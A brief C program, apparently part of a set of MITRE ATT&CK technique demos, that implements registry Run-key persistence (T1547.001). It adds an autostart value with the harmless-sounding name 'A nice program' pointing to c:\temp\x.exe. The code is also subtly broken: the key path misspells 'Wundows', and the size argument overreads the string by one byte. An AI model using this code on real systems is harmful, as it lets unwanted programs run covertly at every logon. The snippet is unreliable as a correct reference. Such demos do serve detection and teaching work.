// Link      = https://attack.mitre.org/techniques/T1547/001/
// Technique = Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
// ID        = T1547.001
// Tactics   = Persistence,

#include <windows.h>

#define KEY_PATH "Software\\Microsoft\\Wundows\\CurrentVersion\\Run"

#define TO_RUN "c:\\temp\\x.exe"

int main() {
    HKEY hKey;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, KEY_PATH,0,KEY_SET_VALUE,&hKey) != ERROR_SUCCESS) {
        return 1;
    }
    RegSetValueExA(hKey,"A nice program",0,REG_SZ,(const BYTE*)TO_RUN,sizeof(TO_RUN)+1);
    RegCloseKey(hKey);

    return 0;
}
